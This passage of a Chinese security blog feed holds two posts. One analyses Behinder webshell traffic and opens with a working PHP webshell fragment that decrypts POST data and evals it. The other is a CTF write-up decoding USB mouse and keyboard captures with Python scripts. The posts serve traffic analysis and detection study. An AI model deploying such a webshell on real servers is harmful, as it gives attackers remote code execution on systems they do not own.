&#123;</span><br><span class=\"line\">        $t=&quot;base64_&quot;.&quot;decode&quot;;</span><br><span class=\"line\">        $post=$t($post.&quot;&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        for($i=0;$i&lt;strlen($post);$i++) &#123;</span><br><span class=\"line\">                 $post[$i] = $post[$i]^$key[$i+1&amp;15]; </span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $post=openssl_decrypt($post, &quot;AES128&quot;, $key);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $arr=explode(&#x27;|&#x27;,$post);</span><br><span class=\"line\">    $func=$arr[0];</span><br><span class=\"line\">    $params=$arr[1];</span><br><span class=\"line\">    class C&#123;public function __invoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125;</span><br><span class=\"line\">    @call_user_func(new C(),$params);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>能看到的是 e45e329feb5d925b 这一串 md5 的前 16 位，后面有注释显示的是密钥就是该 md5 为 rebeyond，那么就以这个作为连接密码进行冰蝎连接</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/AzQcYoF255TLV9EC.png!thumbnail\" alt=\"\"></p>\n<p>保存之后双击添加的数据</p>\n<p>成功连接</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/jiuskQYcIeZy6cqA.png!thumbnail\" alt=\"\"></p>\n<p>接下来使用 wireshark 进行抓包分析</p>\n<p>同样在捕获 -&gt; 选项设置好 WLAN 进行抓包</p>\n<p>接着在命令执行框中输入以下三条命令：</p>\n<ol>\n<li>\n<p>ls /</p>\n</li>\n<li>\n<p>ls /tmp</p>\n</li>\n<li>\n<p>ls /usr</p>\n</li>\n</ol>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ItNIH1gcHM6NhruL.png!thumbnail\" alt=\"\"></p>\n<p>接着停止抓取流量进行分析</p>\n<p>首先先看到了 tcp 追踪流 23</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/yLew2mlMcyrrEeO4.png!thumbnail\" alt=\"\"></p>\n<p>很明显的一个冰蝎流量加密，冰蝎的流量加密的最大一个特点就是先进行一次 base64 加密，再进行一次 AES 加密，至于冰蝎流量的特点：</p>\n<ol>\n<li>User-Agent</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.163 Safari/535.1</span><br><span class=\"line\">Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0) Gecko/20100101 Firefox/6.0 </span><br><span class=\"line\">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50</span><br><span class=\"line\">Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.9.168 Version/144 255 173)&quot;&gt;11.50</span><br><span class=\"line\">Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; Tablet PC 2.0; .NET4.0E)</span><br><span class=\"line\">Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; InfoPath.3)</span><br><span class=\"line\">Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.0)</span><br><span class=\"line\">Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)</span><br><span class=\"line\">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)</span><br><span class=\"line\">Mozilla/5.0 (Windows; U; Windows NT 6.1; ) AppleWebKit/534.12 (KHTML, like Gecko) Maxthon/3.0 Safari/534.12</span><br><span class=\"line\">Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E)</span><br><span class=\"line\">Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E; SE 2.X MetaSr 1.0)</span><br><span class=\"line\">Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.472.33 Safari/534.3 SE 2.X MetaSr 1.0</span><br><span class=\"line\">Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E)</span><br><span class=\"line\">Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/144 255 173)&quot;&gt;13.0.782.41 Safari/535.1 QQBrowser/6.9.144 255 173)&quot;&gt;11079.201</span><br><span class=\"line\">Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E) QQBrowser/6.9.144 255 173)&quot;&gt;11079.201</span><br><span class=\"line\">Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)</span><br></pre></td></tr></table></figure>\n<ol>\n<li>长连接<br>\n冰蝎默认使用的是长连接，因此能看到</li>\n</ol>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/MiLBm3HewNzi6SZ6.png!thumbnail\" alt=\"\"></p>\n<p>Connection 为 keep-alive</p>\n<ol>\n<li>Accept<br>\n 冰蝎的 Accept 字段很特殊，如图所示的请求体 Accept 字段</li>\n</ol>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/6Rfq52djVgr0tpjs.png!thumbnail\" alt=\"\"></p>\n<p>可以在这里调整是查看请求包还是回应包</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/6S3tFiquxDFzKkaC.png!thumbnail\" alt=\"\"></p>\n<p>接下来先将请求的加密字段拿去解密</p>\n<p>这里附上我使用的 aes 解密和 base64 解密网址：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly90aGUteC5jbi9jcnlwdG9ncmFwaHkvQWVzLmFzcHg=\">https://the-x.cn/cryptography/Aes.aspx</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYubXp5MC5jb20vQ3liZXJDaGVmMy8=\">https://ctf.mzy0.com/CyberChef3/</span></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/aQgCMfOWwhWkM9j5.png!thumbnail\" alt=\"\"></p>\n<p>这里说明一下，在解密时需要将 aes 的加密模式调整为 CBC</p>\n<p>key 为上传的 shell.php 中的 16 位加密的密钥即 e45e329feb5d925b</p>\n<p>而偏移量默认为 0123456789abcdef</p>\n<p>可以看到的是有一个 decode 标识着括号里的 base64 码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/pGTGwJsgs1qeMbL1.png!thumbnail\" alt=\"\"></p>\n<p>将 base64 复制下来放入网站中成功解密，而输出的这段代码便是冰蝎对我们命令执行时的加密代码，也同时可以在底部查看到我们输入的命令</p>\n<p>追踪流 23：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/9ofiyS7wJA73jR6v.png!thumbnail\" alt=\"\"></p>\n<p>继续这样去找，能够找到我们之前输入的三个命令</p>\n<p>追踪流 29：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/5PaASe86v1dEeqz4.png!thumbnail\" alt=\"\"></p>\n<p>追踪流 34：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/xLBjKqlvupY4LhSu.png!thumbnail\" alt=\"\"></p>\n<p>接下来切换一下左下角的选项，查看回应包</p>\n<p>追踪流 23：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/4jmut6UKg3yewmBU.png!thumbnail\" alt=\"\"></p>\n<p>一样进行 AES 解密 -&gt;base64 解密</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ZeLLHx28qrcMBUKr.png!thumbnail\" alt=\"\"></p>\n<p>将后面这段复制出来进行 base64 解密</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/WT5iDXH8RF4wdb1r.png!thumbnail\" alt=\"\"></p>\n<p>能发现成功和我们之前执行命令时的回显对上了</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1jEMDZtPmWalFSVV.png!thumbnail\" alt=\"\"></p>\n<p>接下来的两个也都是一样</p>\n<p>追踪流 29：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/LPVSKZHY9omPgvQI.png!thumbnail\" alt=\"\"></p>\n<p>由于流 29 执行的命令是 ls<br>\n/tmp，而 tmp 目录下没有东西，回显也能看到，因此解密出来为空</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/bofnsQu1ctbjzk4z.png!thumbnail\" alt=\"\"></p>\n<p>追踪流 34：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/EKk6b3I5Je4ZlU9Z.png!thumbnail\" alt=\"\"></p>\n<p>也是成功和回显对上了</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/9fsjWNUUeyEMOWkg.png!thumbnail\" alt=\"\"></p>\n<p>回到开头所讲述的冰蝎 3.0 版本没有了动态密钥的获取，因此只有攻击者能够知道密钥是什么，而 2.0 的密钥是能够通过流量进行抓取的（抓取的是加密之后的密钥），相当于是密钥随身跟随，另外冰蝎还有许多的功能之后再慢慢研究</p>\n<p>本片文章是个人的一些看法，还望师傅们多多提建议</p>\n<blockquote>\n<p>PS：最近开放了，还望师傅们多注意身体，别像我一样🐏了个🐏</p>\n</blockquote>\n",
            "tags": [
                "流量"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/USB/",
            "url": "https://nnnpc.github.io/2024/04/16/USB/",
            "title": "USB",
            "date_published": "2024-04-16T05:58:19.038Z",
            "content_html": "<p>最近做到之前经典的流量题有点多，usb 就是其中之一，这里记录一下</p>\n<p>首先 wireshark 打开附件</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/LhLcuWbkya0tO5xt.png!thumbnail\" alt=\"\"></p>\n<p>滑动查看</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Vare5xin8L956m56.png!thumbnail\" alt=\"\"></p>\n<p>能发现数据包的 HID<br>\nData 中带有四字节的数据，猜测为鼠标流量，用 tshark 提取 HID Data 数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tshark -r usb.pcapng -T fields -e usbhid.data &gt; usbdata.txt</span><br></pre></td></tr></table></figure>\n<p>由于是记录目前常用的两种 usb 协议流量，因此就直接进行说明<br>\n在导出的 usbdata.txt 中可以看到</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/2FMn0yQhFoItARSW.png!thumbnail\" alt=\"\"></p>\n<p>除了 4 字节的鼠标流量之外，还有 16 字节的键盘流量，就借着这个附件说明两种流量解密方法</p>\n<h2 id=\"鼠标流量\"><a class=\"markdownIt-Anchor\" href=\"#鼠标流量\">#</a> 鼠标流量</h2>\n<p>首先利用脚本进行删除空行，冒号分隔的操作</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/env python</span><br><span class=\"line\"># -*- coding: utf-8 -*-</span><br><span class=\"line\">info = &#x27;&#x27;&#x27;</span><br><span class=\"line\">kali下运行：</span><br><span class=\"line\">tshark -r usb.pcap -T fields -e usb.capdata &gt; usbdata.txt</span><br><span class=\"line\">提取流量包信息</span><br><span class=\"line\">然后通过该脚本可以过滤掉空格和其他内容，并且添加冒号</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">print(info)</span><br><span class=\"line\"></span><br><span class=\"line\">f_data = input(&quot;请输入带处理txt文件的路径：&quot;)</span><br><span class=\"line\">shujian = int(input(&quot;鼠标流量信息请输入8，键盘流量请输入16：&quot;))</span><br><span class=\"line\">f = open(f_data, &#x27;r&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 整理到out.txt</span><br><span class=\"line\">with open(&#x27;out.txt&#x27;, &#x27;w&#x27;) as f_out:</span><br><span class=\"line\">    for i in f.readlines():</span><br><span class=\"line\">        s = i.strip()</span><br><span class=\"line\">        # 鼠标流量长度为8 ，键盘流量长度为16</span><br><span class=\"line\">        if len(s) == shujian:</span><br><span class=\"line\">            # 鼠标流量长度为8 ，键盘流量长度为16</span><br><span class=\"line\">            nsl = [s[j:j + 2] for j in range(0, shujian, 2)]</span><br><span class=\"line\">            ns = &quot;:&quot;.join(nsl)</span><br><span class=\"line\">            f_out.write(ns)</span><br><span class=\"line\">            f_out.write(&#x27;\\n&#x27;)</span><br></pre></td></tr></table></figure>\n<p>输入路径和 8<br>\n 得到</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/LJCTFRII7jB3Gjtb.png!thumbnail\" alt=\"\"></p>\n<p>接着提取坐标</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nums = []</span><br><span class=\"line\">keys = open(&#x27;out.txt&#x27;,&#x27;r&#x27;)</span><br><span class=\"line\">f = open(&#x27;xy.txt&#x27;,&#x27;w&#x27;)</span><br><span class=\"line\">posx = 0</span><br><span class=\"line\">posy = 0</span><br><span class=\"line\">for line in keys:</span><br><span class=\"line\">    if len(line) != 12 :</span><br><span class=\"line\">        continue</span><br><span class=\"line\">    x = int(line[3:5],16)</span><br><span class=\"line\">    y = int(line[6:8],16)</span><br><span class=\"line\">    if x &gt; 127 :</span><br><span class=\"line\">        x -= 256</span><br><span class=\"line\">    if y &gt; 127 :</span><br><span class=\"line\">        y -= 256</span><br><span class=\"line\">    posx += x</span><br><span class=\"line\">    posy += y</span><br><span class=\"line\">    btn_flag = int(line[0:2],16)  # 1 for left , 2 for right , 0 for nothing</span><br><span class=\"line\">    if btn_flag == 1 : # 1 代表左键</span><br><span class=\"line\">        f.write(str(posx))</span><br><span class=\"line\">        f.write(&#x27; &#x27;)</span><br><span class=\"line\">        f.write(str(posy))</span><br><span class=\"line\">        f.write(&#x27;\\n&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">f.close()</span><br></pre></td></tr></table></figure>\n<p>得到<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/s7ruj39OHOpkHe8p.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>使用 gnuplot 进行画图</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">plot &quot;xy.txt&quot;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/71m441A1k7qSjpYe.png!thumbnail\" alt=\"\"></p>\n<p>得到</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/9P5nlYJzTTNOtW3K.png!thumbnail\" alt=\"\"></p>\n<p>当然这题的 flag 并不是鼠标流量</p>\n<h2 id=\"键盘流量\"><a class=\"markdownIt-Anchor\" href=\"#键盘流量\">#</a> 键盘流量</h2>\n<p>同样使用前面 tshark 提取出的 usbdata.txt</p>\n<h3 id=\"一\"><a class=\"markdownIt-Anchor\" href=\"#一\">#</a> 一</h3>\n<p>可以使用该脚本进行一把梭（该脚本会将不是 8 字节键盘流量的数据给剔除掉）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import os</span><br><span class=\"line\">normalKeys = &#123;&quot;04&quot;:&quot;a&quot;, &quot;05&quot;:&quot;b&quot;, &quot;06&quot;:&quot;c&quot;, &quot;07&quot;:&quot;d&quot;, &quot;08&quot;:&quot;e&quot;, &quot;09&quot;:&quot;f&quot;, &quot;0a&quot;:&quot;g&quot;, &quot;0b&quot;:&quot;h&quot;, &quot;0c&quot;:&quot;i&quot;, &quot;0d&quot;:&quot;j&quot;, &quot;0e&quot;:&quot;k&quot;, &quot;0f&quot;:&quot;l&quot;, &quot;10&quot;:&quot;m&quot;, &quot;11&quot;:&quot;n&quot;, &quot;12&quot;:&quot;o&quot;, &quot;13&quot;:&quot;p&quot;, &quot;14&quot;:&quot;q&quot;, &quot;15&quot;:&quot;r&quot;, &quot;16&quot;:&quot;s&quot;, &quot;17&quot;:&quot;t&quot;, &quot;18&quot;:&quot;u&quot;, &quot;19&quot;:&quot;v&quot;, &quot;1a&quot;:&quot;w&quot;, &quot;1b&quot;:&quot;x&quot;, &quot;1c&quot;:&quot;y&quot;, &quot;1d&quot;:&quot;z&quot;,&quot;1e&quot;:&quot;1&quot;, &quot;1f&quot;:&quot;2&quot;, &quot;20&quot;:&quot;3&quot;, &quot;21&quot;:&quot;4&quot;, &quot;22&quot;:&quot;5&quot;, &quot;23&quot;:&quot;6&quot;,&quot;24&quot;:&quot;7&quot;,&quot;25&quot;:&quot;8&quot;,&quot;26&quot;:&quot;9&quot;,&quot;27&quot;:&quot;0&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;-&quot;,&quot;2e&quot;:&quot;=&quot;,&quot;2f&quot;:&quot;[&quot;,&quot;30&quot;:&quot;]&quot;,&quot;31&quot;:&quot;\\\\&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;;&quot;,&quot;34&quot;:&quot;&#x27;&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;,&quot;,&quot;37&quot;:&quot;.&quot;,&quot;38&quot;:&quot;/&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">shiftKeys = &#123;&quot;04&quot;:&quot;A&quot;, &quot;05&quot;:&quot;B&quot;, &quot;06&quot;:&quot;C&quot;, &quot;07&quot;:&quot;D&quot;, &quot;08&quot;:&quot;E&quot;, &quot;09&quot;:&quot;F&quot;, &quot;0a&quot;:&quot;G&quot;, &quot;0b&quot;:&quot;H&quot;, &quot;0c&quot;:&quot;I&quot;, &quot;0d&quot;:&quot;J&quot;, &quot;0e&quot;:&quot;K&quot;, &quot;0f&quot;:&quot;L&quot;, &quot;10&quot;:&quot;M&quot;, &quot;11&quot;:&quot;N&quot;, &quot;12&quot;:&quot;O&quot;, &quot;13&quot;:&quot;P&quot;, &quot;14&quot;:&quot;Q&quot;, &quot;15&quot;:&quot;R&quot;, &quot;16&quot;:&quot;S&quot;, &quot;17&quot;:&quot;T&quot;, &quot;18&quot;:&quot;U&quot;, &quot;19&quot;:&quot;V&quot;, &quot;1a&quot;:&quot;W&quot;, &quot;1b&quot;:&quot;X&quot;, &quot;1c&quot;:&quot;Y&quot;, &quot;1d&quot;:&quot;Z&quot;,&quot;1e&quot;:&quot;!&quot;, &quot;1f&quot;:&quot;@&quot;, &quot;20&quot;:&quot;#&quot;, &quot;21&quot;:&quot;$&quot;, &quot;22&quot;:&quot;%&quot;, &quot;23&quot;:&quot;^&quot;,&quot;24&quot;:&quot;&amp;&quot;,&quot;25&quot;:&quot;*&quot;,&quot;26&quot;:&quot;(&quot;,&quot;27&quot;:&quot;)&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;_&quot;,&quot;2e&quot;:&quot;+&quot;,&quot;2f&quot;:&quot;&#123;&quot;,&quot;30&quot;:&quot;&#125;&quot;,&quot;31&quot;:&quot;|&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;\\&quot;&quot;,&quot;34&quot;:&quot;:&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;&lt;&quot;,&quot;37&quot;:&quot;&gt;&quot;,&quot;38&quot;:&quot;?&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">nums = []</span><br><span class=\"line\">keys = open(&#x27;usbdata.txt&#x27;)</span><br><span class=\"line\">for line in keys:</span><br><span class=\"line\">    #print(line)</span><br><span class=\"line\">    if len(line)!=17: #首先过滤掉鼠标等其他设备的USB流量</span><br><span class=\"line\">         continue</span><br><span class=\"line\">    nums.append(line[0:2]+line[4:6]) #取一、三字节</span><br><span class=\"line\">    #print(nums)</span><br><span class=\"line\">keys.close()</span><br><span class=\"line\">output = &quot;&quot;</span><br><span class=\"line\">for n in nums:</span><br><span class=\"line\">    if n[2:4] == &quot;00&quot; :</span><br><span class=\"line\">        continue</span><br><span class=\"line\"></span><br><span class=\"line\">    if n[2:4] in normalKeys:</span><br><span class=\"line\">        if n[0:2]==&quot;02&quot;: #表示按下了shift</span><br><span class=\"line\">            output += shiftKeys [n[2:4]]</span><br><span class=\"line\">        else :</span><br><span class=\"line\">            output += normalKeys [n[2:4]]</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        output += &#x27;[unknown]&#x27;</span><br><span class=\"line\">print(&#x27;output :&#x27; + output)</span><br></pre></td></tr></table></figure>\n<p>得到 flag<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/YSwXyswom6ICBpyL.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<h3 id=\"二\"><a class=\"markdownIt-Anchor\" href=\"#二\">#</a> 二</h3>\n<p>当然也可以和鼠标流量一样用脚本先把多余的剔除并且删除空行并使用冒号分隔</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/env python</span><br><span class=\"line\"># -*- coding: utf-8 -*-</span><br><span class=\"line\">info = &#x27;&#x27;&#x27;</span><br><span class=\"line\">kali下运行：</span><br><span class=\"line\">tshark -r usb.pcap -T fields -e usb.capdata &gt; usbdata.txt</span><br><span class=\"line\">提取流量包信息</span><br><span class=\"line\">然后通过该脚本可以过滤掉空格和其他内容，并且添加冒号</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">print(info)</span><br><span class=\"line\"></span><br><span class=\"line\">f_data = input(&quot;请输入带处理txt文件的路径：&quot;)</span><br><span class=\"line\">shujian = int(input(&quot;鼠标流量信息请输入8，键盘流量请输入16：&quot;))</span><br><span class=\"line\">f = open(f_data, &#x27;r&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 整理到out.txt</span><br><span class=\"line\">with open(&#x27;out.txt&#x27;, &#x27;w&#x27;) as f_out:</span><br><span class=\"line\">    for i in f.readlines():</span><br><span class=\"line\">        s = i.strip()</span><br><span class=\"line\">        # 鼠标流量长度为8 ，键盘流量长度为16</span><br><span class=\"line\">        if len(s) == shujian:</span><br><span class=\"line\">            # 鼠标流量长度为8 ，键盘流量长度为16</span><br><span class=\"line\">            nsl = [s[j:j + 2] for j in range(0, shujian, 2)]</span><br><span class=\"line\">            ns = &quot;:&quot;.join(nsl)</span><br><span 